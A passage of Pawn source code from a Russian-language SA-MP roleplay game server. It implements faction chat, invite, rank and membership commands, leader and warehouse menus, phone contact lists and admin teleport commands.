		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(IsAMafia(playerid) || IsAGang(playerid))
	{
    	new text[80];
    	if(sscanf(params, "s[80]", text)) return SendClientMessage(playerid, CGREY, "Используйте: /f [текст]");
   		static const fmt_string[] = "[F] %s %s[%d]: %s";
		new str[sizeof(fmt_string)+32+MAX_PLAYER_NAME+4+80];
		if(strlen(text) >= 40)
		{
			new string1[128];
			strmid(string1,text,41,128,128);
			strdel(text,41,128);
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,string1);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
		}
		else
		{
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
 		}
    }
	return true;
}
CMD:fb(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(IsAMafia(playerid) || IsAGang(playerid))
	{
    	new text[80];
    	if(sscanf(params, "s[80]", text)) return SendClientMessage(playerid, CGREY, "Используйте: /fb [текст]");
   		static const fmt_string[] = "[Fb] (( %s %s[%d]: %s ))";
		new str[sizeof(fmt_string)+32+MAX_PLAYER_NAME+4+80];
		if(strlen(text) >= 40)
		{
			new string1[128];
			strmid(string1,text,41,128,128);
			strdel(text,41,128);
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,string1);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
		}
		else
		{
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
 		}
    }
	return true;
}
CMD:hello(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /hello [id]");
    if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
    new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	SendClientMessage(playerid,CREWARD,"Вы предложили игроку поздороваться с Вами");
   	static const fmt_string1[] = "%s предложил Вам поздароваться с ним";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
	SendClientMessage(params[0],0xFF7F50FF,str1);
	SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
	SetPVarInt(params[0],"Zvarova",playerid+1);
	return true;
}
CMD:invite(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
//	if(!strcmp(FracInfo[PlayerInfo[playerid][pMember]][fLeader], "None", true) && !PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid, CGREY, "Нельзя принимать людей, когда нет лидера");
    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /invite [id]");
    if(PlayerInfo[playerid][pRank] < 9) return SendClientMessage(playerid,CGREY,"Принимать могут только 9 ранги и выше");
    if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
    if(PlayerInfo[params[0]][pWarn] > 0) return SendClientMessage(playerid,CGREY,"Вы не можете принять игрока с варном");

    new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
    if(PlayerInfo[params[0]][pMember] > 0 ) return SendClientMessage(playerid,CGREY,"Данный игрок уже состоит где-либо");
	if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	SendClientMessage(playerid,CREWARD,"Вы предложили игроку присоеденится к вашей организации");
   	static const fmt_string1[] = "%s предложил Вам присоединиться к \"%s\"";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+50];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fName]);
	SendClientMessage(params[0],0xFF7F50FF,str1);
	SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
	SetPVarInt(params[0],"Nachalo",1);
	SetPVarInt(params[0],"Inv",1);
	SetPVarInt(params[0],"InvID",playerid);
	return true;
}
CMD:lpanel(playerid)
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pLeader] > 0)
	{
		static const sas[]= "1 | Транспортировка машин\t[200$]\n2 | Уволить всех игроков оффлайн\n3 | Уволить игрока оффлайн\n4 | Изменить скины\n5 | Объявить набор";
		new sas1[sizeof(sas)+100];
		format(sas1,sizeof(sas1),sas);
		switch(PlayerInfo[playerid][pMember])
		{
		    case F_MAYOR: strcat(sas1,"\n6 | Бонусы к зарплате\n7 | Услуги\n8 | Налоги\n9 | Кодекс штата");
		    case F_LIC: strcat(sas1,"\n6 | Изменить цену на лицензии");
		    case F_LSPD,F_LVPD,F_FBI: strcat(sas1,"\n6 | Удалить установленный объект");
		    case F_HOSPITAL_LS: strcat(sas1,"\n6 | Изменить цену коек");
		    case F_NEWS: strcat(sas1,"\n6 | Изменить цену на объявления\n7 | Изменить цену на SMS\n8 | Изменить цена за звонки");
	    }
	    ShowPlayerDialog(playerid,216,DIALOG_STYLE_LIST,"Панель лидера",sas1,"Далее","Назад");
	}
	return true;
}
CMD:vu(playerid)
{
    if(PlayerInfo[playerid][pVip] < gettime()) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    SendClientMessage(playerid,-1,"Вы увоволились из организации");
	PlayerInfo[playerid][pMember] = 0;
	PlayerInfo[playerid][pSpawnChange] = 0;
	PlayerInfo[playerid][pWork] = 0;
	PlayerInfo[playerid][pRank] = 0;
	PlayerInfo[playerid][pGolos] = 0;
 	PlayerInfo[playerid][pGolos1] = 0;
	for(new i = 0; i <= 4; i++)
	{
	    if(PlayerInfo[playerid][pObject][i] == 0) continue;
		DestroyDynamicObject(PlayerInfo[playerid][pObject][i]);
		DestroyDynamic3DTextLabel(PlayerInfo[playerid][pLable][i]);
	}
	SaveAccount(playerid);
	SetPlayerColor(playerid, 0xFFFFFF20);
	SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
	SetPlayerInt(PlayerInfo[playerid][pSendername],"member",PlayerInfo[playerid][pMember]);
	SetPlayerInt(PlayerInfo[playerid][pSendername],"rank",PlayerInfo[playerid][pRank]);
	return 1;
}

CMD:uninvite(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    if(sscanf(params, "us[64]", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /uninvite [id] [причина]");
    if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pMember] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,CGREY,"Игрок не в Вашей организации");
	if(PlayerInfo[playerid][pRank] < 8) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	if(params[0] == playerid) return SendClientMessage(playerid,CGREY,"Вы не можете применять это действие на себе");
	if(PlayerInfo[playerid][pRank] <= PlayerInfo[params[0]][pRank]) return SendClientMessage(playerid,CGREY,"Вы не можете уволить человека выше себя");
	new text[5];
	if(IsAGang(playerid) || IsAMafia(playerid)) text = "[F]";
	else text = "[R]";
	static const fmt_string[] = "%s %s уволил %s. Причина: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64+5];
	format(str, sizeof(str), fmt_string,text,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],params[1]);
	SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
	static const fmt_string1[] = "%s уволили Вас. Причина: %s";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+64];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],params[1]);
	SendClientMessage(params[0],CREWARD,str1);
	PlayerInfo[params[0]][pMember] = 0;
	PlayerInfo[params[0]][pSpawnChange] = 0;
	PlayerInfo[params[0]][pWork] = 0;
	PlayerInfo[params[0]][pRank] = 0;
	PlayerInfo[params[0]][pGolos] = 0;
 	PlayerInfo[params[0]][pGolos1] = 0;
	for(new i = 0; i <= 4; i++)
	{
	    if(PlayerInfo[params[0]][pObject][i] == 0) continue;
		DestroyDynamicObject(PlayerInfo[params[0]][pObject][i]);
		DestroyDynamic3DTextLabel(PlayerInfo[params[0]][pLable][i]);
	}
	SaveAccount(params[0]);
	SetPlayerColor(params[0], 0xFFFFFF20);
	SetPlayerSkin(params[0],PlayerInfo[params[0]][pModel]);
	SetPlayerInt(PlayerInfo[params[0]][pSendername],"member",PlayerInfo[params[0]][pMember]);
	SetPlayerInt(PlayerInfo[params[0]][pSendername],"rank",PlayerInfo[params[0]][pRank]);
	return true;
}
stock CloseWare(playerid)
{
    if(FracLock[PlayerInfo[playerid][pMember]] == 0)
    {
		new text[5];
		if(IsAGang(playerid) || IsAMafia(playerid)) text = "[F]";
		else text = "[R]";
		static const fmt_string[] = "%s %s закрыл склад организации";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+1+1+5];
		format(str, sizeof(str), fmt_string,text,PlayerInfo[playerid][pSendername]);
		SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
		FracLock[PlayerInfo[playerid][pMember]] = 1;
    }
	else
	{
	    FracLock[PlayerInfo[playerid][pMember]] = 0;
		new text[5];
		if(IsAGang(playerid) || IsAMafia(playerid)) text = "[F]";
		else text = "[R]";
		static const fmt_string[] = "%s %s открыл склад организации";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+1+1+5];
		format(str, sizeof(str), fmt_string,text,PlayerInfo[playerid][pSendername]);
		SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
	}
	switch(PlayerInfo[playerid][pMember])
	{
	    case F_LVPD: SetMatsInt("sapdlock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_FBI: SetMatsInt("fbilock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_GROVE: SetMatsInt("grovelock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_BALLAS: SetMatsInt("ballaslock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_VAGOS: SetMatsInt("vagoslock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_AZTECAS: SetMatsInt("aztecaslock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_BIKERS: SetMatsInt("bikerslock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_YAKUZA: SetMatsInt("triadlock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_LCN: SetMatsInt("lcnlock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_RM: SetMatsInt("rmlock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_RIFA: SetMatsInt("rifalock",FracLock[PlayerInfo[playerid][pMember]]);
	    case F_LSPD: SetMatsInt("lspdlock",FracLock[PlayerInfo[playerid][pMember]]);
	}
}
CMD:warehouse(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    if(PlayerInfo[playerid][pRank] < 9) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    if(PlayerInfo[playerid][pMember] == F_LIC || PlayerInfo[playerid][pMember] == F_HOSPITAL_LS) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    if(PlayerInfo[playerid][pMember] != F_ARMY) CloseWare(playerid);
    else ShowPlayerDialog(playerid,352,DIALOG_STYLE_LIST,"Склад","Закрыть/открыть склад\nИнформация о складах","Далее","Отмена");
	return true;
}

CMD:giverank(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /giverank [id] [ранг]");
    if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pMember] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,CGREY,"Игрок не в Вашей организации");
	if(PlayerInfo[playerid][pRank] < 9 ) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
	if(params[0] == playerid) return SendClientMessage(playerid,CGREY,"Вы не можете применять это действие на себе");
	if(PlayerInfo[playerid][pRank] <= PlayerInfo[params[0]][pRank]) return SendClientMessage(playerid,CGREY,"Вы не можете понизить человека выше себя");
	if(PlayerInfo[params[0]][pRank] == params[1]) return SendClientMessage(playerid,CGREY,"У игрока сейчас данный ранг");
	switch(PlayerInfo[playerid][pRank])
	{
		case 9: if(params[1] < 1 || params[1] > 7) return SendClientMessage(playerid,CGREY,"Укажите ранг от 1 до 7");
		case 10: if(params[1] < 1 || params[1] > 9) return SendClientMessage(playerid,CGREY,"Укажите ранг от 1 до 9");
	}
/*	if(params[1] == 8)
	{
	    new kolv1o = 0;
	    format(query, sizeof(query), "SELECT * FROM accounts WHERE member = '%d' AND rank = '8' AND admin = '0'", PlayerInfo[playerid][pMember]);
		mysql_tquery(mysql,query);
		mysql_store_result();
		if(mysql_fetch_row_format(query)) kolv1o++;
		mysql_free_result();
		if(kolv1o >= 5) return SendClientMessage(playerid,CGREY,"Максмально количество 8-ых рангов - 5 человек");
	}
	else if(params[1] == 9)
	{
	    new kolv1o = 0;
	    format(query, sizeof(query), "SELECT * FROM accounts WHERE member = '%d' AND rank = '9' AND admin = '0'", PlayerInfo[playerid][pMember]);
		mysql_tquery(mysql,query);
		mysql_store_result();
		if(mysql_fetch_row_format(query)) kolv1o++;
		mysql_free_result();
		if(kolv1o >= 3) return SendClientMessage(playerid,CGREY,"Максмально количество 9-ых рангов - 3 человек");
	}*/
	new text[5],text1[20];
	if(PlayerInfo[params[0]][pRank] < params[1]) text1 = "повысил";
	else text1 = "понизил";
	if(IsAGang(playerid) || IsAMafia(playerid)) text = "[F]";
	else text = "[R]";
	static const fmt_string[] = "%s %s %s %s c %i до %i ранга";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+1+1+5];
	format(str, sizeof(str), fmt_string,text,PlayerInfo[playerid][pSendername],text1,PlayerInfo[params[0]][pSendername],PlayerInfo[params[0]][pRank],params[1]);
	SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
	static const fmt_string1[] = "%s %s Вас до %i ранга";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+30];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],text1,params[1]);
	SendClientMessage(params[0],CREWARD,str1);
	str1 = "";
	format(str1, sizeof(str1), "Вы %s %s до %i ранга",text1,PlayerInfo[params[0]][pSendername],params[1]);
	SendClientMessage(playerid,CREWARD,str1);
	PlayerInfo[params[0]][pRank] = params[1];
	SetPlayerInt(PlayerInfo[params[0]][pSendername],"rank",PlayerInfo[params[0]][pRank]);
	return true;
}
CMD:givekeys(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда");
    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /givekeys [id]");
    SendClientMessage(playerid,CREWARD,"Вы выдали игроку пропуск");
	SendClientMessage(params[0],CREWARD,"Вам выдали пропуск");
	SetPVarInt(params[0],"Prop",PlayerInfo[playerid][pMember]);
	return true;
}

function ShowPhoneBlackList(playerid)
{
    new rows = cache_get_row_count(mysql);
    query = "";
    strcat(query, "{20BA09}Добавить в черный список\n{FFFFFF}");
	if(rows > 0)
	{
	    new sas,kek,sos22,str[30];
	    for(new row = 1;row<=rows; row++)
		{
		    sas = cache_get_field_content_int(row-1, "num", mysql);
			format(str,sizeof(str),"Номер: %i\n",sas);
			strcat(query, str);
			ListNick[playerid][kek] = sas;
			kek++;
			if(kek >= 15)
			{
			    sos22 = cache_get_field_content_int(row-1, "id", mysql);
			    SetPVarInt(playerid,"CheckPlayer",sos22);
			    break;
			}
			if(GetPVarInt(playerid,"CheckPlayer")) strcat(query, "\nДалее >>");
		}
	}
	ShowPlayerDialog(playerid,422,DIALOG_STYLE_LIST,"Черный список",query,"Выбрать","Закрыть");
	return 1;
}
function ShowPhoneContakt(playerid)
{
    new rows = cache_get_row_count(mysql);
    query = "";
    strcat(query, "{20BA09}Добавить в контакты\n{FFFFFF}");
	if(rows > 0)
	{
	    new sas,sos[24],kek,sos22,str[60];
	    for(new row = 1;row<=rows; row++)
		{
			sas = cache_get_field_content_int(row-1, "num", mysql);
	  		cache_get_field_content(row-1, "name", sos, mysql);

			format(str,sizeof(str),"Имя: %s | Номер: %i\n",sos,sas);
			strcat(query, str);
			ListNick[playerid][kek] = sas;
			kek++;

			if(kek >= 15)
			{
			    sos22 = cache_get_field_content_int(row-1, "id", mysql);
			    SetPVarInt(playerid,"CheckPlayer",sos22);
			    break;
			}
			if(GetPVarInt(playerid,"CheckPlayer")) strcat(query, "\nДалее >>");
	    }
	}
	ShowPlayerDialog(playerid,340,DIALOG_STYLE_LIST,"Список контактов",query,"Далее","Отмена");
	return 1;
}

function OffMemberShow(playerid)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    new sos[32],sos1,check,sos22;
	    new str[110];
		query = "";
		new year, month, day, hour, minute, second;
		for(new row = 1;row<= rows; row++)
		{
            sos1 = cache_get_field_content_int(row-1, "rank", mysql);
            cache_get_field_content(row-1, "name", sos, mysql);
            if(GetPlayerID(sos) != INVALID_PLAYER_ID)
			{
				
				format(str,sizeof(str),"{FFFFFF}%s: Ранг: %d | Должность: %s | {3caa3c}Online\n",sos,sos1,FracRank[PlayerInfo[playerid][pMember]][sos1]);
				strcat(query, str);
			}
			else
			{
				TimestampToDate(cache_get_field_content_int(row-1, "reg", mysql), year, month, day, hour, minute, second,0);
				
				format(str,sizeof(str),"{FFFFFF}%s: Ранг: %d | Должность: %s | Последний заход: %02d/%02d/%02d %02d:%02d:%02d\n",sos,sos1,FracRank[PlayerInfo[playerid][pMember]][sos1],day,month,year,hour, minute, second);
				strcat(query, str);
			}
			check++;
			if(check >= 15)
			{
			    sos22 = cache_get_field_content_int(row-1, "id", mysql);
			    SetPVarInt(playerid,"CheckPlayer",sos22);
			    break;
			}
			if(!GetPVarInt(playerid,"CheckPlayer")) ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Состав организации",query,"Назад","");
			else ShowPlayerDialog(playerid,279,DIALOG_STYLE_MSGBOX,"Состав организации",query,"Далее","Назад");
		}
	}
	return 1;
}
CMD:offmembers(playerid, params[])
{
	if(!PlayerInfo[playerid][pLeader]) return 1;
    if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, CGREY, "Не флуди!");
    query = "";
    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE member = '%d'", PlayerInfo[playerid][pMember]);
	mysql_tquery(mysql, query, "OffMemberShow", "d", playerid);
  /*  new srrt[1500];
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE member = '%d'", PlayerInfo[playerid][pMember]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	new war1[30],reg[6],sos[32],sos1[5],check,sos22[5];
    if(mysql_num_rows() > 0)
    {
		for(new i = 1; i <= mysql_num_rows();i++)
		{
			mysql_fetch_row(query);
			mysql_get_field("name", sos);
			mysql_get_field("rank", sos1);
			if(GetPlayerID(sos) != INVALID_PLAYER_ID)
			{
				new str[110];
				format(str,sizeof(str),"{FFFFFF}%s: Ранг: %d | Должность: %s | {3caa3c}Online\n",sos,strval(sos1),FracRank[PlayerInfo[playerid][pMember]][strval(sos1)]);
				strcat(srrt, str);
			}
			else
			{
				mysql_get_field("reg", war1);
				sscanf(war1, "p<,>a<i>[5]",reg);
				new str[100];
				format(str,sizeof(str),"{FFFFFF}%s: Ранг: %d | Должность: %s | Последний заход: %02d/%02d/%02d %02d:%02d:%02d\n",sos,strval(sos1),FracRank[PlayerInfo[playerid][pMember]][strval(sos1)],reg[0],reg[1],reg[2],reg[3],reg[4],reg[5]);
				strcat(srrt, str);
			}
			check++;
			if(check >= 15)
			{
			    mysql_get_field("id", sos22);
			    SetPVarInt(playerid,"CheckPlayer",strval(sos22));
			    break;
			}
		}
		mysql_free_result();
		SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
		if(!GetPVarInt(playerid,"CheckPlayer")) ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Состав организации",srrt,"Назад","");
		else ShowPlayerDialog(playerid,279,DIALOG_STYLE_MSGBOX,"Состав организации",srrt,"Далее","Назад");
    }*/
	return true;
}
CMD:members(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
	query = "";
	new trx[10],check = 0, kek = GetOnline(PlayerInfo[playerid][pMember]);
	new str1[50];
	static const fmt_string[] = "%s%s[%i]: Ранг: %i | Должность: %s%s\n";
	new str[sizeof(fmt_string)+2+MAX_PLAYER_NAME+4+2+32+10];
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
        if(PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember])
        {
            
			if(GetPVarInt(i, "AFK_Time") > 1) format(str1,sizeof(str1),", АФК: %i сек",GetPVarInt(i,"AFK_Time"));
			else str1 = "";
			if(IsAMafia(i) || IsAGang(i))
			{

				format(str, sizeof(str), fmt_string,"{FFFFFF}",PlayerInfo[i][pSendername],i,PlayerInfo[i][pRank],FracRank[PlayerInfo[i][pMember]][PlayerInfo[i][pRank]],str1);
				strcat(query,str);
			}
			else
			{
				if(PlayerInfo[i][pWork] == 0) trx = "{AFAFAF}";
				else trx = "{FFFFFF}";
				
				format(str, sizeof(str), fmt_string,trx,PlayerInfo[i][pSendername],i,PlayerInfo[i][pRank],FracRank[PlayerInfo[i][pMember]][PlayerInfo[i][pRank]],str1);
				strcat(query,str);
			
			}
			check++;
			if(check >= 15)
			{
			    SetPVarInt(playerid,"InfoMem",kek);
			    SetPVarInt(playerid,"CheckPlayer",i);
			    break;
			}
		}
	}
	static const fmt_string1[] = "Состав организации онлайн %i человек";
	new str3[sizeof(fmt_string1)+3];
	format(str3, sizeof(str3), fmt_string1,kek);
	if(!GetPVarInt(playerid,"CheckPlayer")) ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,str3,query,"Назад","");
	else ShowPlayerDialog(playerid,278,DIALOG_STYLE_MSGBOX,str3,query,"Далее","Назад");
	return true;
}
CMD:tpobj(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	new Float: coorx,Float: coory,Float: coorz;
	if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /tpcor x y z");
	GetObjectPos(params[0],coorx,coory,coorz);
	SetPlayerPos(playerid,coorx,coory,coorz);
	return true;
}
CMD:tpcor(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	new Float: coorx,Float: coory,Float: coorz;
	if(sscanf(params, "fff", coorx,coory,coorz)) return SendClientMessage(playerid, CGREY, "Используйте: /tpcor x y z");
	SetPlayerPos(playerid,coorx,coory,coorz);
	SetPlayerInterior(playerid,0);
	return true;
}
CMD:tpmark(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	SetPlayerPosFindZ(playerid, GetPVarFloat(playerid,"aX"), GetPVarFloat(playerid,"aY"), GetPVarFloat(playerid,"aZ"));
	return true;
}

CMD:tphome(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /tphome [номер дома]");
	if(params[0] < 1 || params[0] > TOTALHOUSE) return true;
	SetPlayerPos(playerid,HInfo[params[0]][hX],HInfo[params[0]][hY],HInfo[params[0]][hZ]);
	SetPlayerInterior(playerid,0);
	return true;
}
CMD:tpbiz(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	new bizid;
	if(sscanf(params, "i", bizid)) return SendClientMessage(playerid, CGREY, "Используйте: /tpbiz [номер бизнеса]");
	if(bizid < 1 || bizid > TOTALBIZ) return true;
	SetPlayerPos(playerid,BizInfo[bizid][bXX1],BizInfo[bizid][bYY1],BizInfo[bizid][bZZ1]);
	SetPlayerInterior(playerid,0);
	return true;
}

CMD:menu(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
   	static const fmt_string1[] = "{FFFFFF}1 | Статистика\n2 | Команды сервера\n{f7ae11}3 | Квесты{ffffff}\n4 | Связь с администрацией\n5 | Задать вопрос\n6 | Настройка аккаунта\n7 | Улучшения\n8 | Безопасность\n9 | Дополнительно\n10 | Ввести промокод";
	new str1[sizeof(fmt_string1)];
	format(str1, sizeof(str1), fmt_string1);
	ShowPlayerDialog(playerid,10,DIALOG_STYLE_LIST,"Главное меню",str1,"Далее","Закрыть");
	return true;
}
CMD:setvirt(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /setvirt [id локации]");
	SetPlayerVirtualWorld(playerid,params[0]);
	return true;
}
CMD:setintr(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /setintr [id локации]");
	SetPlayerInterior(playerid,params[0]);
	return true;
}
CMD:intt(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /intt [id локации]");
	if(params[0] < 1 || params[0] > 134) return SendClientMessage(playerid, CGREY, "ID локации от 1 до 134!");
	switch(params[0]) {
	case 1: { SetPlayerPos(playerid,-25.884499,-185.868988,1003.549988); SetPlayerInterior(playerid,17); }
	case 2: { SetPlayerPos(playerid,6.091180,-29.271898,1003.549988); SetPlayerInterior(playerid,10); }
	case 3: { SetPlayerPos(playerid,-30.946699,-89.609596,1003.549988); SetPlayerInterior(playerid,18); }
	case 4: { SetPlayerPos(playerid,-25.132599,-139.066986,1003.549988); SetPlayerInterior(playerid,16); }
	case 5: { SetPlayerPos(playerid,-27.312300,-29.277599,1003.549988); SetPlayerInterior(playerid,4); }
	case 6: { SetPlayerPos(playerid,-26.691599,-55.714897,1003.549988); SetPlayerInterior(playerid,6); }
	case 7: { SetPlayerPos(playerid,-1827.147338,7.207418,1061.143554); SetPlayerInterior(playerid,14); }
	case 8: { SetPlayerPos(playerid,2.384830,33.103397,1199.849976); SetPlayerInterior(playerid,1); }
